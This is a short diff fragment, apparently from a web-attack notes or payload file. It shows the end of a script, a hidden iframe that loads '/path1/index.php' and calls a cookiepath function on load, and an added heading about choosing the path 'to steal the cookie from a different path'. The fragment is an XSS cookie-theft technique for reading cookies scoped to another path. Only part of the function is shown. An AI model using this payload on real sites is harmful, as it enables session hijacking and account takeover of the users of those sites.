@@ -7,3 +7,6 @@ function cookiepath(path)
   }
 </script>
 <iframe onload="cookiepath('/path1/')" style="display:none;" src="/path1/index.php"></iframe>
+
+## select the path needed to steal the cookie from a different path
+
